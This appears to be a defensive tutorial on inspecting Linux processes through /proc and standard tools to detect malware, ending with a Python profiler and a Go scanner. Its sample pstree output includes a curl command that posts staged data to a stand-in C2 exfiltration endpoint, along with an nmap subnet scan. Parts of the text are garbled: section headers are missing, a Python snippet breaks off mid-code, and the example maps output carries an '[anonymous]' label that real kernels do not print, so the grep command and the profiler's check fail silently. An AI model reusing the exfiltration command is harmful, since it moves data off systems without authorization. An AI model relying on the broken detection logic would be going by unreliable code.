Process Monitoring

Monitor running processes through /proc and lsof to detect hidden binaries, executable memory, command-and-control connections, and privilege anomalies.

Overview

The kernel exposes everything it knows about a running process under /proc . Reading those files from the outside gives a complete view of a suspicious binary without attaching to it or modifying it. This article maps the useful /proc/PID/ entries, then turns them into detection signals for hidden binaries, injected code, and outbound command-and-control channels.

Required Reading

  • Processes - Linux process lifecycle, /proc structure, and process state tracking
  • System Call Tracing - system call tracing with strace, understanding kernel interactions

The Observable Process

Everything the kernel knows about a running process is exposed in /proc . This is not debug information or optional metadata - it is the kernel's accounting. Memory mappings, open file descriptors, network sockets, environment variables, namespace bindings, seccomp state. All of it is readable by any process with appropriate permissions.

For malware analysis, /proc is a surveillance tool. You monitor a suspicious process from the outside: no code injection, no ptrace attachment, no modification of the target. Pure observation. The malware cannot detect you reading its /proc/PID/ files unless it polls them itself - and most malware does not poll /proc/self/ for monitoring detection.

/proc/PID/: The Complete Reference

Every process has a directory at /proc/PID/ . Each file in it exposes a different facet of the process.

cmdline - Command Line Arguments

$ cat /proc/12345/cmdline | tr '\0' ' '
./suspicious.bin --daemon --config /etc/.hidden/config.ini

/proc/PID/cmdline contains the original argv array, null-separated. This is what ps aux displays as the COM MAN D column.

Malware frequently spoofs this: after execve() , the binary can overwrite its own argv in memory. The kernel reads what is in the process's memory at that address - which may not match the actual executable. Checking the command line against the running binary: 

$ cat /proc/12345/cmdline | tr '\0' ' '
[kworker/u8:2]

$ ls -la /proc/12345/exe
lrwxrwxrwx 1 root root 0 Jun 26 10:00 /proc/12345/exe -> /tmp/.hidden/miner (deleted)

The cmdline says [kworker/u8:2] (a kernel worker). The actual binary is /tmp/.hidden/miner . This process is masquerading as a kernel thread. The (deleted) indicates the binary has been unlinked from disk - self-deleting malware.

environ - Environment Variables

$ cat /proc/12345/environ | tr '\0' '\n'
PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
HOME=/root
LD_PRELOAD=/tmp/.hidden/libhide.so
SECRET_KEY=deadbeefcafebab3
USER=root

Environment variables reveal: - LD_PRELOAD : Hooking library - the binary intercepts libc functions. This is a rootkit technique. - SECRET_KEY : Hardcoded key passed through environment

  • decryption key for payload. - HOME=/root : The binary runs as root. Elevated privileges.
  • USER=root : Duplicate information, but confirms context.

Malware uses environment variables as a covert channel: pass data from parent to child without command-line arguments (which appear in ps ).

cwd - Current Working Directory

$ readlink /proc/12345/cwd
/var/tmp/.cache_3429

The process operates from a hidden directory in /var/tmp . This is where it reads/writes files with relative paths. Combined with opened file descriptors, this reveals the malware's data directory.

exe - Executable Symlink

$ ls -la /proc/12345/exe
lrwxrwxrwx 1 root root 0 Jun 26 10:00 /proc/12345/exe -> /usr/bin/sshd (deleted)

If the symlink ends with (deleted) , the binary was executed and then the file was unlinked. This is self-deleting malware - the binary persists in memory but cannot be found on disk. To recover it: 

$ cp /proc/12345/exe /tmp/recovered_binary
$ file /tmp/recovered_binary
/tmp/recovered_binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), stripped

This recovers the binary from memory. Even though the file was unlinked, the kernel keeps the inode alive while the process uses it.

fd/ - Open File Descriptors

$ ls -la /proc/12345/fd/
total 0
dr-x------ 2 root root  0 Jun 26 10:00 .
dr-xr-xr-x 9 root root  0 Jun 26 10:00 ..
lrwx------ 1 root root 64 Jun 26 10:00 0 -> /dev/null
lrwx------ 1 root root 64 Jun 26 10:00 1 -> /dev/null
lrwx------ 1 root root 64 Jun 26 10:00 2 -> /dev/null
lrwx------ 1 root root 64 Jun 26 10:00 3 -> socket:[123456]
lrwx------ 1 root root 64 Jun 26 10:00 4 -> /tmp/.exfil/data.tar.gz
lr-x------ 1 root root 64 Jun 26 10:00 5 -> /home/user/Documents/taxes.pdf

What this reveals: - FD 0-2: stdin, stdout, stderr all redirected to /dev/null . Daemonized

  • no terminal. - FD 3: socket:[123456] - a network socket. The inode number (123456) links to /proc/net/tcp .
  • FD 4: /tmp/.exfil/data.tar.gz - writable file. Staging exfiltrated data.
  • FD 5: /home/user/Documents/taxes.pdf - a user file opened for reading. Being exfiltrated.

The combination of network socket + user file + staging tar = exfiltration in progress.

For each FD, fdinfo/ gives additional detail: 

$ cat /proc/12345/fdinfo/4
pos:    1048576
flags:  0100001
mnt_id: 25

Position 1,048,576 bytes - the binary has already written 1 MB to the staging file.

maps - Memory Mappings

$ cat /proc/12345/maps
555555554000-555555557000 r-xp 00000000 08:01 524289  /tmp/.hidden/miner (deleted)
555555756000-555555757000 r--p 00002000 08:01 524289  /tmp/.hidden/miner (deleted)
555555757000-555555758000 rw-p 00003000 08:01 524289  /tmp/.hidden/miner (deleted)
7f1234000000-7f1234021000 rw-p 00000000 00:00 0        [heap]
7f1238000000-7f1238005000 r-xp 00000000 08:01 131072  /usr/lib/libc.so.6
7f1238005000-7f1238204000 ---p 00005000 08:01 131072  /usr/lib/libc.so.6
7f1238204000-7f1238208000 r--p 00004000 08:01 131072  /usr/lib/libc.so.6
7f1238208000-7f1238209000 rw-p 00008000 08:01 131072  /usr/lib/libc.so.6
7f1238209000-7f1238211000 rw-p 00000000 00:00 0
7f1239000000-7f1239001000 rwxp 00000000 00:00 0        [anonymous]
7f1239001000-7f1239100000 rw-p 00000000 00:00 0        [anonymous]
7ffff7e00000-7ffff7e01000 rw-p 00000000 00:00 0        [stack]

Each line: address perms offset dev inode path .

Critical observations: - RWX anonymous mapping : rwxp at 7f1239000000-7f1239001000 - anonymous memory (not backed by a file) with read, write, and execute permissions. This is where shellcode or an unpacked payload lives. The p (private) flag means changes are not written back to any file. - Deleted executable : The executable at 555555554000 has (deleted)

  • confirmed self-deleting. - Stack without execute : rw-p on [stack] - NX bit active. Normal.
  • Large anonymous rw-p regions : The region at 7f1239001000-7f1239100000 is~1 MB of writable anonymous memory. Buffer for network data or crypto operations.
  • Libraries : libc.so.6 mapped with proper permissions (r-xp for code, r--p for rodata, rw-p for data). Normal.

To find all anonymous executable regions (commonly shellcode):

$ grep 'rwxp.*anonymous' /proc/12345/maps
7f1239000000-7f1239001000 rwxp 00000000 00:00 0        [anonymous]
7f123a000000-7f123a002000 rwxp 00000000 00:00 0        [anonymous]

Two RWX anonymous regions. The second is 8 KB - likely a second-stage payload.

smaps - Detailed Memory

$ cat /proc/12345/smaps

smaps extends maps with accounting: RSS (resident set size), PSS (proportional), swap, and mapping flags. For malware analysis, watch for large RSS in anonymous regions - that is heap data, extracted configs, or stolen data buffered in memory.

12345 (suspicious.bi) S 1 12345 12345 0 -1 4194304 734 0 0 0 0 0 0 0 20 0 5 0 25165824 3006464 368 18446744073709551615 93824995966976 93824995969000 140722665431184 0 0 0 0 0 0 0 0 0 17 4 0 0 0 0 0 93824995971120 93824995971192 93824995989504 140722665434591 140722665434596 140722665434596 140722665435633 0

Key fields: - Field 3 (State): S = sleeping, R = running, Z = zombie, T = stopped, D = uninterruptible sleep. - Field 14 (utime) and 15 (stime): CPU time in user and kernel mode (jiffies). High values = CPU -bound malware (cryptominer). - Field 24 (rss): Resident set size in pages. Multiply by 4 KB for RSS in bytes.

  • Field 25 (rsslim): RSS limit. Unusually small limit = self-restriction to avoid detection.

statm - Memory Summary

$ cat /proc/12345/statm
6144 734 368 108 0 132 0

Seven fields (in pages):

  1. Total program size (6144 pages = 24 MB)
  2. Resident set size (734 pages =~2.9 MB)
  3. Shared pages (368 pages =~1.4 MB)
  4. Text/code (108 pages = 432 KB) - small code = minimal binary or packed stub
  5. Library (0 pages - statically linked or library not counted)
  6. Data + stack (132 pages = 528 KB)
  7. Dirty pages (0 - nothing modified in memory)

The small text size (432 KB) with large total size (24 MB) means the binary allocates far more memory than the executable itself occupies. This is suspicious - the extra memory is for payload, network buffers, or stolen data.

io - I/O Statistics

$ cat /proc/12345/io
rchar: 45678901
wchar: 12345678
syscr: 8923
syscw: 3456
read_bytes: 45678592
write_bytes: 12341248
cancelled_write_bytes: 0
  • read_bytes : Total bytes read from storage. 44 MB - if the binary is small, it is reading other files.
  • write_bytes : Total bytes written to storage. 12 MB - data exfiltration to a local staging file, or encryption output.
  • syscr vs syscw : 8923 read syscalls vs 3456 write syscalls. More reads than writes - data theft.

For malware, the key files:

$ cat /proc/12345/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0F02000A:E52B 4E38220C:1F90 01 00000000:00000000 00:00000000 00000000     0        0 123456 1 0000000000000000 100 0 0 10 0

Decode: - Local address 0F02000A:E52B : IP 10.0.2.15 , port 58667 (hex reverse: E52B = 58667). - Remote address 4E38220C:1F90 : IP 12.34.56.78 , port 8080 . - State 01 = ESTABLISHED. - inode 123456 - links to /proc/12345/fd/3 -> socket:[123456] .

task/ - Threads

$ ls /proc/12345/task/
12345  12346  12347  12348  12349

Five threads. Each has its own /proc/PID/task/TID/ directory with per-thread stats, CPU usage, and scheduling info. A thread consuming 100% CPU while others are idle indicates a crypto-miner thread. 

$ cat /proc/12345/task/12346/status | grep -E 'State|VmRSS'
State:  R (running)
VmRSS:  412 kB

Thread 12346 is actively running (state R ). While the main thread (12345) is sleeping. This thread is the active component - likely the C2 loop or crypto worker.

cgroup - Control Group

$ cat /proc/12345/cgroup
0::/system.slice/docker-abc123.scope

The cgroup path reveals: - /docker-abc123.scope : Process runs inside a Docker container. Container escape scenario. - /system.slice/sshd.service : Process is an SSH daemon child - legitimate. - /user.slice/user-1000.slice/session-3.scope : User session process.

Malware running in /user.slice/ with strange names (like kworker or [kthreadd] ) and a binary path pointing to /tmp is suspicious. Legitimate kernel workers are in kernel cgroups.

attr/ - SELinux Context

$ cat /proc/12345/attr/current
unconfined_u:unconfined_r:unconfined_t:s0

SELinux context. If the binary is confined (non- unconfined_t ), SELinux is enforcing restrictions

  • the malware's capabilities are limited by policy.

Process Monitoring Tools

ps - Process Snapshot

$ ps aux | grep -E 'PID|12345'
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root     12345  0.2  0.3  24576  2936 ?        Ssl  10:00   0:04 ./suspicious.bin

Key columns: - STAT : Process state. S = sleeping (interruptible), s = session leader, l = multi-threaded. Ssl = sleeping session leader with threads. - VSZ : Virtual memory size (24 MB). - RSS : Resident physical memory (2.9 MB). - START : Start time. Useful for correlating with incident timelines.

Custom ps format for malware analysis:

$ ps -eo pid,ppid,user,rss,vsz,stat,start,time,args
						
$ ps -eo pid,ppid,user,rss,vsz,stat,args --sort=-%mem | head -20

Top 20 by memory usage. Crypto-miners and data exfiltration tools use large RSS.

pstree - Process Hierarchy

$ pstree -p 12345
suspicious.bin(12345)─+─curl(12346)
                       ├─bash(12347)───nmap(12348)
                       ├─{suspicious.b}(12349)
                       └─{suspicious.b}(12350)

The binary forked three children: - curl(12346) : Data exfiltration or payload download. - bash(12347) with child nmap(12348) : Script-based network scanning. - Two threads {suspicious.b} : Internal concurrency.

The combination curl + nmap + threads = a botnet node doing reconnaissance and exfiltration simultaneously. 

$ pstree -ap 12345
suspicious.bin,12345 --daemon
  ├─curl,12346 -s -X POST -d @/tmp/data.tar.gz http://c2/bot/exfil.php
  ├─bash,12347 -c nmap -sS -p 22,80,443 192.168.1.0/24
  │   └─nmap,12348 -sS -p 22,80,443 192.168.1.0/24
  ├─{suspicious.bin},12349
  └─{suspicious.bin},12350

With -a (show arguments), the full commands appear: - curl POSTs a tar.gz to the C2 exfiltration endpoint. - bash runs nmap scanning the local subnet for SSH / HTTP / HTTPS (lateral movement).

top/htop - Live Monitoring

$ top -p 12345

Live view of CPU , memory, and uptime. For long-running malware, observe: - CPU pattern: 100% constant = miner. Burst activity = periodic beaconing or file scanning. - Memory growth over time: Data accumulation (stolen files, logs, keylogged input). - PID changes: The process exits and respawns (watchdog mechanism). 

$ htop -p 12345

htop shows per-thread CPU and open file counts. Press l for lsof integration - shows open files directly.

pgrep / pkill

$ pgrep -f suspicious.bin
12345
$ pgrep -u root -f '\.bin'
12345

Find processes by pattern, user, parent, or session. Use pgrep -l for name output: 

$ pgrep -l -u root -f '/tmp/'
12345 miner

A process named miner runs from /tmp/ as root - immediate investigation required.

ss / netstat - Network Connections

$ ss -tnp | grep 12345
ESTAB  0  0  10.0.2.15:58667  12.34.56.78:8080  users:(("suspicious.bi",pid=12345,fd=3))

All TCP connections for the process. ss is faster than netstat (reads directly from netlink vs parsing /proc/net/tcp ).

Listening sockets:

$ ss -tlnp | grep 12345
LISTEN 0 128 0.0.0.0:8081 0.0.0.0:* users:(("suspicious.bi",pid=12345,fd=4))

The binary listens on port 8081 - an inbound C2 channel or backdoor service.

UDP : 

$ ss -unp | grep 12345
UNCONN 0  0  0.0.0.0:53  0.0.0.0:* users:(("suspicious.bi",pid=12345,fd=3))

UDP port 53 bound - the binary may be running its own DNS server for exfiltration or C2 resolution.

Seccomp Mode

$ cat /proc/12345/status | grep Seccomp
Seccomp:        2
Seccomp_filters:        1
  • Seccomp: 0 : No seccomp. Normal process.
  • Seccomp: 1 : Seccomp strict mode (only read , write , _exit , sigreturn ). The binary severely restricts itself - unusual for malware, common for sandboxed processes.
  • Seccomp: 2 : Seccomp filter mode (BPF-based). The binary sets a custom filter. Malware can use this to restrict its own syscalls (defense evasion: avoid triggering seccomp-based EDR ). Or it can be a sandboxed container process.
  • Seccomp_filters: N : Number of seccomp filters attached. More than 1 means layered filtering - often from a container runtime (Docker/Podman).

Malware in a container with Seccomp: 2 is container-aware: it knows it is restricted and may attempt container escape.

Cgroup Context

$ cat /proc/12345/cgroup
0::/system.slice/containerd.service/123abc456def.scope

The cgroup path reveals the container runtime. containerd , docker , podman , lxc - each has distinct cgroup paths. Malware running in a container cgroup but accessing host files ( /proc/1/root/ ) is attempting container escape. 

$ ls -la /proc/12345/root
lrwxrwxrwx 1 root root 0 Jun 26 10:00 /proc/12345/root -> /

If this symlink resolves to / (the host root), the process sees the host filesystem - not a container filesystem. Compare with: 

$ podman exec -it container_name ls -la /proc/1/root
lrwxrwxrwx 1 root root 0 Jun 26 10:00 /proc/1/root -> /var/lib/containers/storage/overlay/abc123/merged

Containerized processes have a root pointing to the overlay mount, not the host root.

UID and Capability Tracking

$ cat /proc/12345/status | grep -E 'Uid|Gid|Cap'
Uid:    0       0       0       0
Gid:    0       0       0       0
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

UID 0 = root. For a suspicious binary running as root, check capabilities:

  • CapEff=0000000000000000 : No effective capabilities (but root has all by default unless dropped).
  • CapBnd=000001ffffffffff : Full bounding set - all capabilities available.
  • CapPrm=0000000000000000 : Zero permitted caps - the binary dropped them.

If the binary runs as non-root but has CapEff with CAP_SYS_PTRACE (bit 19), it can ptrace other processes - this is an injection mechanism.

Decode capabilities:

$ python3 -c "
caps = 0x000001ffffffffff
map = {
    0: 'CHOWN', 1: 'DAC_OVERRIDE', 2: 'DAC_READ_SEARCH',

Process Profiler Script

Combine all /proc inspection into a single snapshot tool: 

#!/usr/bin/env python3
"""
process_profiler.py -- snapshot a process and flag suspicious indicators
Usage: python3 process_profiler.py <PID>
"""
import os
import sys
import socket
import struct


def hex_to_ip(hex_str: str) -> str:
    return socket.inet_ntoa(struct.pack('<I', int(hex_str, 16)))


def hex_to_port(hex_str: str) -> int:
    return int(hex_str, 16)


def proc_read(path: str) -> str:
    try:
        with open(path) as f:
            return f.read().strip()
    except (FileNotFoundError, PermissionError):
        return ''


def parse_status(pid: int) -> dict:
    status = {}
    content = proc_read(f'/proc/{pid}/status')
    for line in content.splitlines():
        if ':' in line:
            key, val = line.split(':', 1)
            status[key.strip()] = val.strip()
    return status


def parse_maps(pid: int) -> list:
    maps = []
    content = proc_read(f'/proc/{pid}/maps')
    for line in content.splitlines():
        if not line:
            continue
        parts = line.split()
        if len(parts) >= 5:
            addr_range = parts[0]
            perms = parts[1]
            path = parts[-1] if len(parts) > 5 else ''
            maps.append({
                'range': addr_range,
                'perms': perms,
                'path': path,
            })
    return maps


def parse_tcp(pid: int) -> list:
    connections = []
    content = proc_read(f'/proc/{pid}/net/tcp')
    lines = content.splitlines()
    if len(lines) < 2:
        return connections

    for line in lines[1:]:
        parts = line.split()
        if len(parts) < 8:
            continue
        local = parts[1].split(':')
        remote = parts[2].split(':')
        state = parts[3]
        inode = parts[9]

        try:
            local_addr = hex_to_ip(local[0])
            local_port = hex_to_port(local[1])
            remote_addr = hex_to_ip(remote[0])
            remote_port = hex_to_port(remote[1])
        except Exception:
            continue

        connections.append({
            'local': f'{local_addr}:{local_port}',
            'remote': f'{remote_addr}:{remote_port}',
            'state': state,
            'inode': inode,
        })
    return connections


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <PID>")
        sys.exit(1)

    pid = int(sys.argv[1])

    print(f"{'=' * 60}")
    print(f"  PROCESS PROFILER - PID {pid}")
    print(f"{'=' * 60}")

    # Basic info
    cmdline = proc_read(f'/proc/{pid}/cmdline').replace('\x00', ' ')
    exe = os.readlink(f'/proc/{pid}/exe') if os.path.exists(f'/proc/{pid}/exe') else 'N/A'
    cwd = os.readlink(f'/proc/{pid}/cwd') if os.path.exists(f'/proc/{pid}/cwd') else 'N/A'

    print(f"\n  CMDLINE:  {cmdline or '(empty/spoofed)'}")
    print(f"  EXE:      {exe}")
    print(f"  CWD:      {cwd}")

    # Status
    status = parse_status(pid)
    uid = status.get('Uid', '').split()[0]
    ppid = status.get('PPid', '')
    seccomp = status.get('Seccomp', '')
    threads = status.get('Threads', '')
    tracer = status.get('TracerPid', '')

    print(f"\n  --- STATUS ---")
    print(f"  UID:       {uid}")
    print(f"  PPID:      {ppid}")
    print(f"  Threads:   {threads}")
    print(f"  TracerPID: {tracer}")
    print(f"  Seccomp:   {seccomp}")

    # Suspicious flags
    flags = []

    # Deleted executable
    if '(deleted)' in exe:
        flags.append(f"Executable deleted from disk: {exe}")

    # RWX mappings
    maps = parse_maps(pid)
    rwx_maps = [m for m in maps if m['perms'] == 'rwxp' and 'anonymous' in m['path']]
    if rwx_maps:
        for m in rwx_maps:
            flags.append(f"RWX anonymous mapping: {m['range']}")

    # Run as root
    if uid == '0':
        flags.append("Running as ROOT (UID 0)")

    # Daemonized
    if ppid == '1':
        flags.append("Daemonized: PPID=1 (parent exited, adopted by init)")

    # Tracer
    if tracer and tracer != '0':
        flags.append(f"Being traced by PID {tracer}")

    # High thread count
    try:
        if int(threads) > 4:
            flags.append(f"High thread count: {threads}")
    except ValueError:
        pass

    # Seccomp
    if seccomp == '2':
        flags.append(f"Seccomp filter mode active (sandboxed?)")

    # Cgroup container check
    cgroup = proc_read(f'/proc/{pid}/cgroup')
    container_runtimes = ['docker', 'containerd', 'podman', 'lxc', 'kubepods']
    for rt in container_runtimes:
        if rt in cgroup:
            flags.append(f"Running in container ({rt} detected in cgroup)")
            break

    # Network connections
    conns = parse_tcp(pid)
    if conns:
        print(f"\n  --- NETWORK ({len(conns)} TCP connections) ---")
        for c in conns:
            print(f"  {c['local']} -> {c['remote']}  [{c['state']}]")
        # Check for unusual ports
        unusual_ports = [c for c in conns
                         if hex_to_port(c['remote'].split(':')[1]) not in {80, 443, 22, 53}]
        if unusual_ports:
            flags.append(f"Connections on unusual ports: {len(unusual_ports)} found")

    # Open FDs
    try:
        fds = os.listdir(f'/proc/{pid}/fd')
        print(f"\n  --- FILE DESCRIPTORS ({len(fds)}) ---")
        socket_fds = 0
        for fd in fds[:30]:
            try:
                link = os.readlink(f'/proc/{pid}/fd/{fd}')
                if 'socket:' in link:
                    socket_fds += 1
                if len(fds) <= 20:
                    print(f"  fd {fd}: {link}")
            except OSError:
                pass
        if socket_fds > 0:
            print(f"  ... {socket_fds} socket FDs")
        if len(fds) > 30:
            print(f"  ... {len(fds) - 30} more FDs")
    except PermissionError:
        pass

    # Flags summary
    if flags:
        print(f"\n  --- SUSPICIOUS INDICATORS ---")
        for f in flags:
            print(f"  [!] {f}")
    else:
        print(f"\n  --- No suspicious indicators ---")

    print(f"{'=' * 60}")


if __name__ == '__main__':
    main()

Challenge

Write a Go tool that scans every PID under /proc and prints the processes that look suspicious: a deleted executable, an anonymous mapping with rwxp permissions, UID 0, or a parent that is PID 1. Run it against a normal shell and then against a small test process that mmap s an executable region, and compare the output. 

package main

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func readFile(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return string(data)
}

func main() {
	entries, err := filepath.Glob("/proc/[0-9]*")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	for _, dir := range entries {
		pid := filepath.Base(dir)
		status := readFile(filepath.Join(dir, "status"))
		if status == "" {
			continue
		}

		var name, uid, ppid string
		scanner := bufio.NewScanner(strings.NewReader(status))
		for scanner.Scan() {
			line := scanner.Text()
			switch {
			case strings.HasPrefix(line, "Name:"):
				name = strings.TrimSpace(strings.TrimPrefix(line, "Name:"))
			case strings.HasPrefix(line, "Uid:"):
				fields := strings.Fields(line)
				if len(fields) > 1 {
					uid = fields[1]
				}
			case strings.HasPrefix(line, "PPid:"):
				ppid = strings.TrimSpace(strings.TrimPrefix(line, "PPid:"))
			}
		}

		var flags []string

		if target, err := os.Readlink(filepath.Join(dir, "exe")); err == nil {
			if strings.HasSuffix(target, "(deleted)") {
				flags = append(flags, "deleted exe: "+target)
			}
		}

		for _, line := range strings.Split(readFile(filepath.Join(dir, "maps")), "\n") {
			fields := strings.Fields(line)
			if len(fields) < 2 {
				continue
			}
			if strings.HasPrefix(fields[1], "rwxp") {
				flags = append(flags, "rwx mapping: "+fields[0])
			}
		}

		if uid == "0" {
			flags = append(flags, "running as uid 0")
		}
		if ppid == "1" {
			flags = append(flags, "parent is init")
		}

		if len(flags) > 0 {
			fmt.Printf("%s (%s) uid=%s ppid=%s\n", pid, name, uid, ppid)
			for _, flag := range flags {
				fmt.Printf("  [!] %s\n", flag)
			}
		}
	}
}
